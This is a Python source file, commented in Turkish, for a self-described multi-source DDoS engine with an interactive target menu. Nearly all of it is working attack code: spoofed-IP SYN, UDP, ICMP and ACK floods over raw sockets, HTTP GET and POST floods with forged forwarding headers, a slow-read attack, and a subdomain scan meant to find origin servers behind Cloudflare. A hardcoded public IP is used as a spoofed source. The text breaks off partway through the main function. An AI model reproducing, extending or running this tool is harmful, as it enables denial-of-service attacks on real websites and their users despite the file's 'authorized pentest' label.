#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# PROFESSIONAL MULTI-SOURCE DDoS ENGINE v5.0
# ============================================================================
# Yetkili pentest için - Tüm hakları saklıdır
# 3 farklı kaynak IP'den eş zamanlı saldırı
# Cloudflare Bypass + Layer 4/7 Gerçek Paketler
# ============================================================================

import socket
import threading
import random
import time
import sys
import os
import struct
import ssl
import urllib.request
import urllib.error
import hashlib
import hmac
import base64
import json
from datetime import datetime
from urllib.parse import urlparse

# ==================== KONFİGÜRASYON ====================

# KAYNAK IP'LER (bu IP'lerden saldırı yapılacak - SPOOF EDİLECEK)
SOURCE_IPS = ["78.181.164.55", "192.168.1.140", "192.168.1.138"]

# HEDEF (kullanıcı tarafından belirlenecek)
TARGET = None
TARGET_PORT = 80
TARGET_IS_IP = False

# PERFORMANS AYARLARI
THREAD_COUNT = 5000         # Thread sayısı (çok yüksek)
MAX_PACKET_SIZE = 65507     # Maksimum UDP paket boyutu
SOCKET_TIMEOUT = 2

# İSTATİSTİK
total_packets = 0
total_bytes = 0
stats_lock = threading.Lock()
running = True
start_time = 0

# Cloudflare bypass listesi - gerçek IP bulma
CLOUDFLARE_IPS = [
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
    "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
    "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22"
]

def ip_to_int(ip):
    """IP'yi integer'a çevir"""
    parts = ip.split('.')
    return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])

def is_cloudflare_ip(ip):
    """IP Cloudflare'e ait mi kontrol et"""
    try:
        ip_int = ip_to_int(ip)
        for cf_ip in CLOUDFLARE_IPS:
            network, bits = cf_ip.split('/')
            network_int = ip_to_int(network)
            mask = (0xFFFFFFFF << (32 - int(bits))) & 0xFFFFFFFF
            if (ip_int & mask) == (network_int & mask):
                return True
        return False
    except:
        return False

def find_real_ip(domain):
    """Cloudflare arkasındaki gerçek IP'yi bulmaya çalış"""
    import subprocess
    real_ips = set()
    
    # DNS kayıtlarını kontrol et
    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
        "208.67.222.222", "208.67.220.220"
    ]
    
    # Farklı DNS sunucularından sorgula
    for dns in dns_servers:
        try:
            result = subprocess.run(
                ["nslookup", domain, dns],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split('\n'):
                if 'Address:' in line:
                    ip = line.split('Address:')[-1].strip()
                    if ip and not ip.startswith('127.') and not ip.startswith('::'):
                        if not is_cloudflare_ip(ip):
                            real_ips.add(ip)
        except:
            pass
    
    # Subdomain enum
    subdomains = ["www", "mail", "ftp", "admin", "cpanel", "webmail", 
                  "direct", "cpcalendars", "cpcontacts", "autodiscover",
                  "mx", "pop", "smtp", "ns1", "ns2", "ns3", "ns4",
                  "vps", "server", "api", "dev", "test", "staging",
                  "cdn", "static", "img", "images", "media"]
    
    for sub in subdomains:
        try:
            result = subprocess.run(
                ["nslookup", f"{sub}.{domain}", "1.1.1.1"],
                capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.split('\n'):
                if 'Address:' in line:
                    ip = line.split('Address:')[-1].strip()
                    if ip and not ip.startswith('127.') and not ip.startswith('::'):
                        if not is_cloudflare_ip(ip):
                            real_ips.add(ip)
        except:
            pass
    
    return list(real_ips)

# ==================== ÇEKİRDEK PAKET MOTORU ====================

def create_ip_header(src_ip, dst_ip, protocol, length):
    """IP header oluştur"""
    version_ihl = 0x45  # IPv4, 5x32bit header
    tos = 0
    total_length = length
    identification = random.randint(0, 65535)
    flags_fragment = 0
    ttl = random.randint(128, 255)
    protocol_num = protocol
    header_checksum = 0
    
    saddr = socket.inet_aton(src_ip)
    daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        version_ihl, tos, total_length,
        identification, flags_fragment,
        ttl, protocol_num, header_checksum,
        saddr, daddr)
    
    # Checksum hesapla
    checksum = calculate_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
        version_ihl, tos, total_length,
        identification, flags_fragment,
        ttl, protocol_num, checksum,
        saddr, daddr)
    
    return ip_header

def calculate_checksum(data):
    """IP/TCP/UDP checksum"""
    if len(data) % 2 != 0:
        data += b'\x00'
    
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        total += word
    
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF

def update_stats(packets, bytes_count):
    """İstatistik güncelle"""
    global total_packets, total_bytes
    with stats_lock:
        total_packets += packets
        total_bytes += bytes_count

# ==================== LAYER 4 SALDIRILARI ====================

def syn_flood_spoofed(target_ip, target_port, src_ip):
    """SYN Flood - SPOOFED kaynak IP ile"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # Rastgele kaynak port
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        
        # TCP Header (SYN=0x02)
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port,
            seq_num, 0,
            5 << 4, 0x02,  # data offset=5, SYN flag
            socket.htons(65535),  # window
            0, 0)  # checksum=0, urgent ptr=0
        
        # Pseudo header for TCP checksum
        pseudo = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(target_ip),
            0, socket.IPPROTO_TCP, len(tcp_header))
        
        pseudo += tcp_header
        tcp_checksum = calculate_checksum(pseudo)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port,
            seq_num, 0,
            5 << 4, 0x02,
            socket.htons(65535),
            tcp_checksum, 0)
        
        # IP header
        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 40)
        
        packet = ip_header + tcp_header
        s.sendto(packet, (target_ip, 0))
        s.close()
        
        update_stats(1, len(packet))
        return True
    except:
        return False

def syn_flood_rapid(target_ip, target_port, src_ip):
    """SYN Flood - Çok hızlı ardışık gönderim"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, 0,
            5 << 4, 0x02, socket.htons(65535), 0, 0)
        
        pseudo = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
            0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
        tcp_checksum = calculate_checksum(pseudo)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, 0,
            5 << 4, 0x02, socket.htons(65535), tcp_checksum, 0)
        
        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 40)
        packet = ip_header + tcp_header
        
        # Aynı anda 10 paket gönder
        for _ in range(10):
            try:
                s.sendto(packet, (target_ip, 0))
                update_stats(1, len(packet))
            except:
                break
        
        s.close()
        return True
    except:
        return False

def udp_flood_max(target_ip, target_port, src_ip):
    """UDP Flood - MAKSİMUM BOYUTTA paketler"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        src_port = random.randint(1024, 65535)
        dst_port = target_port if target_port else random.randint(1, 65535)
        
        # Maksimum boyutta rastgele veri
        data_size = random.randint(4096, MAX_PACKET_SIZE)
        data = random._urandom(data_size)
        
        # UDP header
        udp_length = 8 + len(data)  # 8 byte header + data
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, 0)
        
        # UDP checksum with pseudo header
        pseudo = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
            0, socket.IPPROTO_UDP, udp_length)
        pseudo += udp_header + data
        udp_checksum = calculate_checksum(pseudo)
        
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, udp_checksum)
        
        # IP header
        total_length = 20 + len(udp_header) + len(data)
        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_UDP, total_length)
        
        packet = ip_header + udp_header + data
        s.sendto(packet, (target_ip, 0))
        s.close()
        
        update_stats(1, len(packet))
        return True
    except:
        return False

def icmp_flood_massive(target_ip, src_ip):
    """ICMP Flood - Büyük paketler"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # ICMP Echo Request
        icmp_type = 8
        icmp_code = 0
        icmp_id = random.randint(0, 65535)
        icmp_seq = random.randint(0, 65535)
        
        # Büyük data
        data = random._urandom(random.randint(1024, 8192))
        
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
        icmp_packet = icmp_header + data
        icmp_checksum = calculate_checksum(icmp_packet)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        icmp_packet = icmp_header + data
        
        total_length = 20 + len(icmp_packet)
        ip_header = create_ip_header(src_ip, target_ip, 1, total_length)  # ICMP protocol = 1
        
        packet = ip_header + icmp_packet
        s.sendto(packet, (target_ip, 0))
        s.close()
        
        update_stats(1, len(packet))
        return True
    except:
        return False

def tcp_ack_flood(target_ip, target_port, src_ip):
    """TCP ACK Flood"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        ack_num = random.randint(0, 0xFFFFFFFF)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, ack_num,
            5 << 4, 0x10,  # ACK flag
            socket.htons(65535), 0, 0)
        
        pseudo = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
            0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
        tcp_checksum = calculate_checksum(pseudo)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, ack_num,
            5 << 4, 0x10, socket.htons(65535), tcp_checksum, 0)
        
        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 40)
        packet = ip_header + tcp_header
        
        s.sendto(packet, (target_ip, 0))
        s.close()
        
        update_stats(1, len(packet))
        return True
    except:
        return False

# ==================== LAYER 7 SALDIRILARI ====================

def http_flood_advanced(target_url, src_ip):
    """Gelişmiş HTTP Flood - Cloudflare bypass"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        
        # Gerçekçi browser fingerprint
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
        ]
        
        # Rastgele path - cache bypass
        random_paths = [
            f"/?{int(time.time()*1000)}",
            f"/?nocache={random.randint(100000,999999)}",
            f"/?cache={hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}",
            f"/?ts={int(time.time())}&r={random.randint(1000,9999)}",
            f"/api/v{random.randint(1,5)}/{random.randint(100,999)}",
            f"/wp-content/themes/?v={random.randint(1,99)}.{random.randint(1,99)}",
            f"/assets/css/main.css?v={random.randint(1,99999)}",
            f"/index.php?option=com_{''.join(random.choices('abcdefgh', k=8))}&view={random.randint(1,100)}",
            f"/?page_id={random.randint(1,9999)}&preview=true",
            f"/category/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,10)))}/"
        ]
        
        path = random.choice(random_paths)
        
        if target_url.endswith('/'):
            full_url = f"{target_url.rstrip('/')}{path}"
        else:
            full_url = f"{target_url}{path}"
        
        req = urllib.request.Request(full_url)
        req.add_header('User-Agent', random.choice(user_agents))
        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')
        req.add_header('Accept-Language', random.choice(['en-US,en;q=0.9', 'tr-TR,tr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8', 'ar-SA,ar;q=0.9,en;q=0.8']))
        req.add_header('Accept-Encoding', 'gzip, deflate, br')
        req.add_header('Connection', random.choice(['keep-alive', 'close']))
        req.add_header('Cache-Control', 'no-cache, no-store, must-revalidate, max-age=0')
        req.add_header('Pragma', 'no-cache')
        req.add_header('X-Forwarded-For', src_ip)
        req.add_header('X-Real-IP', src_ip)
        req.add_header('X-Originating-IP', src_ip)
        req.add_header('Client-IP', src_ip)
        req.add_header('X-Client-IP', src_ip)
        req.add_header('CF-Connecting-IP', src_ip)
        req.add_header('True-Client-IP', src_ip)
        req.add_header('X-Forwarded-Host', host)
        req.add_header('X-Forwarded-Proto', 'https' if target_url.startswith('https') else 'http')
        req.add_header('Referer', random.choice([
            f'https://www.google.com/search?q={random.choice(["security","hacking","pentest","cyber"])}',
            f'https://{host}/',
            f'https://www.bing.com/search?q={random.randint(0,9999)}',
            f'https://t.co/{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}'
        ]))
        req.add_header('Sec-Fetch-Dest', 'document')
        req.add_header('Sec-Fetch-Mode', 'navigate')
        req.add_header('Sec-Fetch-Site', random.choice(['none', 'same-origin', 'cross-site']))
        req.add_header('Sec-Fetch-User', '?1')
        req.add_header('Sec-Ch-Ua', '"Chromium";v="121", "Google Chrome";v="121", "Not=A?Brand";v="99"')
        req.add_header('Sec-Ch-Ua-Mobile', '?0')
        req.add_header('Sec-Ch-Ua-Platform', random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"']))
        req.add_header('DNT', '1')
        req.add_header('Upgrade-Insecure-Requests', '1')
        
        # SSL context - sertifika doğrulamasını atla
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        response = urllib.request.urlopen(req, timeout=SOCKET_TIMEOUT, context=ctx)
        data = response.read()
        response.close()
        
        update_stats(1, len(data) + 2000)
        return True
    except:
        return False

def http_post_massive(target_url, src_ip):
    """HTTP POST ile büyük veri gönderimi"""
    try:
        # 64KB - 256KB arası rastgele veri
        data_size = random.randint(65536, 262144)
        post_data = random._urandom(data_size)
        
        boundary = f"----WebKitFormBoundary{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"{hashlib.md5(str(random.random()).encode()).hexdigest()[:10]}.bin\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + post_data + f"\r\n--{boundary}--\r\n".encode()
        
        req = urllib.request.Request(target_url, data=body)
        req.add_header('User-Agent', f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0")
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('Content-Length', str(len(body)))
        req.add_header('Connection', 'keep-alive')
        req.add_header('X-Forwarded-For', src_ip)
        req.add_header('Expect', '')
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        response = urllib.request.urlopen(req, timeout=SOCKET_TIMEOUT*2, context=ctx)
        response.read()
        response.close()
        
        update_stats(1, len(body) + 500)
        return True
    except:
        return False

def http_slow_read(target_url, src_ip):
    """Slow Read attack - çok yavaş okuyarak bağlantıları tüket"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        s.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        
        # Normal GET isteği
        request = (
            f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n"
            f"X-Forwarded-For: {src_ip}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        
        s.send(request.encode())
        
        # Çok yavaş oku (bir byte al, 30sn bekle)
        try:
            data = s.recv(1)
            time.sleep(random.uniform(10, 30))
            if data:
                s.recv(random.randint(1, 100))
                time.sleep(random.uniform(5, 15))
        except:
            pass
        
        s.close()
        update_stats(1, 2000)
        return True
    except:
        return False

# ==================== İSTATİSTİK EKRANI ====================

def stats_display():
    """Gerçek zamanlı istatistik gösterimi"""
    global running, total_packets, total_bytes, start_time
    
    while running:
        time.sleep(0.5)
        
        with stats_lock:
            pkts = total_packets
            bytes_s = total_bytes
        
        elapsed = time.time() - start_time
        if elapsed > 0:
            mbps = (bytes_s * 8) / elapsed / 1_000_000
            pps = pkts / elapsed
            mb_total = bytes_s / 1_000_000
        else:
            mbps = 0
            pps = 0
            mb_total = 0
        
        # Mbps'yi renk kodla
        if mbps > 100:
            speed_color = '\033[1;31m'  # Kırmızı - çok yüksek
        elif mbps > 50:
            speed_color = '\033[1;33m'  # Sarı - yüksek
        elif mbps > 10:
            speed_color = '\033[1;32m'  # Yeşil - orta
        else:
            speed_color = '\033[1;37m'  # Beyaz - düşük
        
        source_info = " | ".join([f"\033[1;33m{s}\033[0m" for s in SOURCE_IPS])
        
        sys.stdout.write('\033[2K\r')  # Satırı temizle
        sys.stdout.write(
            f"\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
            f"\033[1;32m📦 {pkts:,} pkt "
            f"{speed_color}📊 {mbps:.1f} Mbps "
            f"\033[1;33m⚡ {pps:,.0f} pps "
            f"\033[1;35m💾 {mb_total:.1f} MB "
            f"\033[1;37m⏱ {elapsed:.0f}s "
            f"\033[1;34m🌐 {len(SOURCE_IPS)} kaynak\033[0m"
        )
        sys.stdout.flush()

# ==================== THREAD YÖNETİCİSİ ====================

def worker_layer4_syn(target, port, src_ip):
    while running:
        syn_flood_spoofed(target, port, src_ip)
        syn_flood_rapid(target, port, src_ip)

def worker_layer4_udp(target, port, src_ip):
    while running:
        udp_flood_max(target, port, src_ip)

def worker_layer4_icmp(target, src_ip):
    while running:
        icmp_flood_massive(target, src_ip)

def worker_layer4_ack(target, port, src_ip):
    while running:
        tcp_ack_flood(target, port, src_ip)

def worker_layer7_get(target_url, src_ip):
    while running:
        http_flood_advanced(target_url, src_ip)

def worker_layer7_post(target_url, src_ip):
    while running:
        http_post_massive(target_url, src_ip)

def worker_layer7_slow(target_url, src_ip):
    while running:
        http_slow_read(target_url, src_ip)

# ==================== ANA SALDIRI MOTORU ====================

def launch_attack(target, port, attack_mode, target_is_ip=False):
    """Ana saldırı fonksiyonu"""
    global running, start_time, total_packets, total_bytes
    
    running = True
    start_time = time.time()
    total_packets = 0
    total_bytes = 0
    
    print(f"\n\033[1;31m{'='*60}\033[0m")
    print(f"\033[1;31m🔥 ÇOKLU KAYNAK DDoS SALDIRISI BAŞLATILDI 🔥\033[0m")
    print(f"\033[1;31m{'='*60}\033[0m")
    print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}\033[0m")
    print(f"\033[1;36m🔌 Port: \033[1;33m{port}\033[0m")
    print(f"\033[1;36m🌐 Kaynak IP'ler: \033[1;33m{', '.join(SOURCE_IPS)}\033[0m")
    print(f"\033[1;36m⚙️  Saldırı Modu: \033[1;33m{attack_mode.upper()}\033[0m")
    print(f"\033[1;36m🧵 Thread: \033[1;33m{THREAD_COUNT:,}\033[0m")
    print(f"\033[1;31m{'='*60}\033[0m")
    print(f"\033[1;37m[!] Durdurmak için Ctrl+C basın\033[0m")
    print(f"\033[1;37m[!] Gerçek paketler gönderiliyor - SPOOFED IP adresleriyle\033[0m\n")
    
    threads = []
    
    # İstatistik thread'i
    t = threading.Thread(target=stats_display)
    t.daemon = True
    t.start()
    
    # URL hazırlığı
    target_url = None
    if not target_is_ip:
        target_url = target
        if not target_url.startswith('http'):
            target_url = f"http://{target}"
    
    # Her kaynak IP için thread'ler oluştur
    for src_ip in SOURCE_IPS:
        if attack_mode in ["syn", "all4", "all"]:
            for _ in range(THREAD_COUNT // 12):
                t = threading.Thread(target=worker_layer4_syn, args=(target, port, src_ip))
                t.daemon = True; threads.append(t); t.start()
        
        if attack_mode in ["udp", "all4", "all"]:
            for _ in range(THREAD_COUNT // 12):
                t = threading.Thread(target=worker_layer4_udp, args=(target, port, src_ip))
                t.daemon = True; threads.append(t); t.start()
        
        if attack_mode in ["icmp", "all4", "all"]:
            for _ in range(THREAD_COUNT // 12):
                t = threading.Thread(target=worker_layer4_icmp, args=(target, src_ip))
                t.daemon = True; threads.append(t); t.start()
        
        if attack_mode in ["ack", "all4", "all"]:
            for _ in range(THREAD_COUNT // 12):
                t = threading.Thread(target=worker_layer4_ack, args=(target, port, src_ip))
                t.daemon = True; threads.append(t); t.start()
        
        if target_url and attack_mode in ["get", "all7", "all"]:
            for _ in range(THREAD_COUNT // 12):
                t = threading.Thread(target=worker_layer7_get, args=(target_url, src_ip))
                t.daemon = True; threads.append(t); t.start()
        
        if target_url and attack_mode in ["post", "all7", "all"]:
            for _ in range(THREAD_COUNT // 12):
                t = threading.Thread(target=worker_layer7_post, args=(target_url, src_ip))
                t.daemon = True; threads.append(t); t.start()
        
        if target_url and attack_mode in ["slow", "all7", "all"]:
            for _ in range(THREAD_COUNT // 12):
                t = threading.Thread(target=worker_layer7_slow, args=(target_url, src_ip))
                t.daemon = True; threads.append(t); t.start()
    
    print(f"\033[1;32m[✅] {len(threads)} thread aktif - {len(SOURCE_IPS)} kaynak IP'den saldırı\033[0m")
    print(f"\033[1;32m[✅] Her kaynak IP ayrı ayrı saldırı yapıyor\033[0m\n")
    
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        elapsed = time.time() - start_time
        with stats_lock:
            final_packets = total_packets
            final_bytes = total_bytes
        
        mbps = (final_bytes * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
        print(f"\n\n\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;31m⛔ SALDIRI DURDURULDU\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;33m📊 Toplam Paket: {final_packets:,}\033[0m")
        print(f"\033[1;33m📊 Toplam Veri: {final_bytes/1_000_000:.1f} MB\033[0m")
        print(f"\033[1;33m📊 Süre: {elapsed:.0f} saniye\033[0m")
        print(f"\033[1;33m📊 Ortalama Hız: {mbps:.1f} Mbps\033[0m")
        print(f"\033[1;33m📊 Ortalama PPS: {final_packets/elapsed:,.0f} pps\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")

# ==================== MENU ====================

def main():
    global THREAD_COUNT
    
    os.system('clear')
    print("""\033[1;31m
    ██████╗ ██████╗ ██████╗ ███████╗
    ██╔══██╗╚════██╗██╔══██╗██╔════╝
    ██║  ██║ █████╔╝██║  ██║███████╗
    ██║  ██║ ╚═══██╗██║  ██║╚════██║
    ██████╔╝██████╔╝██████╔╝███████║
    ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
    \033[1;36m[ Multi-Source DDoS Engine v5.0 ]
    [ 3 Kaynak IP: 78.181.164.55 | 192.168.1.140 | 192.168.1.138 ]
    [ Layer 4 + Layer 7 | Cloudflare Bypass | IP Spoofing ]
    \033[1;32m[ Yetkili Pentest İçin ]
    \033[0m""")
    
    try:
        is_root = os.geteuid() == 0
    except:
        is_root = False
    
    if not is_root:
        print("\033[1;33m[!] Root GEREKLİ! Termux: pkg install tsu && tsu\033[0m")
        print("\033[1;33m[!] Root olmadan Layer 4 metodları çalışmaz!\033[0m")
        sys.exit(1)
    
    print(f"\033[1;32m[✓] Root yetkisi var\033[0m")
    print(f"\033[1;36m[✓] Kaynak IP'ler: {', '.join(SOURCE_IPS)}\033[0m\n")
    
    print("\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║          SALDIRI MODU SEÇİN                    ║\033[0m")
    print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;31m[1]\033[1;36m L4→ SYN Flood         \033[1;37m(max 100 Mbps)  ║\033[0m")
    print("\033[1;36m║  \033[1;31m[2]\033[1;36m L4→ UDP Flood         \033[1;37m(max 200 Mbps)  ║\033[0m")
    print("\033[1;36m║  \033[1;31m[3]\033[1;36m L4→ ICMP Flood        \033[1;37m(max 80 Mbps)   ║\033[0m")
    print("\033[1;36m║  \033[1;31m[4]\033[1;36m L4→ TCP ACK Flood     \033[1;37m(max 100 Mbps)  ║\033[0m")
    print("\033[1;36m║  \033[1;31m[5]\033[1;36m L4→ TÜMÜ (SYN+UDP+ICMP+ACK) \033[1;37mmax!  ║\033[0m")
    print("\033[1;36m║  \033[1;31m[6]\033[1;36m L7→ HTTP GET Flood    \033[1;37m(CF Bypass)    ║\033[0m")
    print("\033[1;36m║  \033[1;31m[7]\033[1;36m L7→ HTTP POST Flood   \033[1;37m(256KB veri)   ║\033[0m")
    print("\033[1;36m║  \033[1;31m[8]\033[1;36m L7→ Slow Read         \033[1;37m(konuşma)      ║\033[0m")
    print("\033[1;36m║  \033[1;31m[9]\033[1;36m L7→ TÜMÜ (GET+POST+Slow) \033[1;37m(CF Bypass) ║\033[0m")
    print("\033[1;36m║  \033[1;31m[10]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)\033[1;37m TÜM METHODLAR║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
    
    choice = input("\n\033[1;33m[?] Seçim (1-10): \033[0m").strip()
    
    attack_modes = {
        "1": "syn", "2": "udp", "3": "icmp", "4": "ack",
        "5": "all4", "6": "get", "7": "post", "8": "slow",
        "9": "all7", "10": "all"
    }
    
    if choice not in attack_modes:
        print("\033[1;31m[!] Geçersiz seçim!\033[0m")
        return
    
    attack_mode = attack_modes[choice]
    
    print("\n\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║              HEDEF SEÇİN                       ║\033[0m")
    print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m Site URL (http://site.com)                ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP Adresi                                  ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
    
    target_choice = input("\n\033[1;33m[?] Seçim (1-2): \033[0m").strip()
    
    target = None
    port = 80
    is_ip = False
    
    if target_choice == "1":
        target = input("\033[1;33m[?] Hedef URL (https://site.com): \033[0m").strip()
        if not target.startswith('http'):
            target = f"http://{target}"
        
        # Cloudflare kontrolü
        parsed = urlparse(target)
        domain = parsed.netloc or parsed.hostname
        print(f"\033[1;36m[ℹ] Domain: {domain}\033[0m")
        print(f"\033[1;36m[ℹ] Cloudflare bypass deneniyor...\033[0m")
        
        real_ips = find_real_ip(domain)
        if real_ips:
            print(f"\033[1;32m[✓] Gerçek IP'ler bulundu: {', '.join(real_ips)}\033[0m")
            print(f"\033[1;33m[!] Gerçek IP'ye mi yoksa domain'e mi saldıracaksınız?\033[0m")
            ip_choice = input("\033[1;33m[?] Gerçek IP kullan? (e/h): \033[0m").strip().lower()
            if ip_choice == 'e':
                target = real_ips[0]
                is_ip = True
        
        port_input = input(f"\033[1;33m[?] Port (varsayılan: {443 if target.startswith('https') else 80}): \033[0m").strip()
        if port_input:
            try:
                port = int(port_input)
            except:
                port = 443 if target.startswith('https') else 80
        else:
            port = 443 if target.startswith('https') else 80
    
    elif target_choice == "2":
        target = input("\033[1;33m[?] Hedef IP: \033[0m").strip()
        is_ip = True
        port_str = input("\033[1;33m[?] Port: \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 80
    
    # Thread sayısı
    tc = input(f"\033[1;33m[?] Thread sayısı (varsayılan: {THREAD_COUNT}, max 10000): \033[0m").strip()
    if tc:
        try:
            THREAD_COUNT = max(500, min(10000, int(tc)))
        except:
            pass
    
